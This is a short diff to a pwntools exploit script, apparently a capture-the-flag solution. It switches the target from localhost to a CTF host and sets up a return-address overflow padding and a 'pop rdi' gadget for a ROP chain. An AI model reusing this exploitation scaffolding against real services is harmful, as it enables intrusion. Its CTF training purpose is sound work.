@@ -2,7 +2,8 @@ from pwn import *
 
 context.arch = 'amd64'
 
-r = remote('127.0.0.1',8888)
+#r = remote('127.0.0.1',8888)
+r = remote('csie.ctf.tw',10131)
 
 ret_offset = 'Giby'*10
 pop_rdi = 0x4006f3
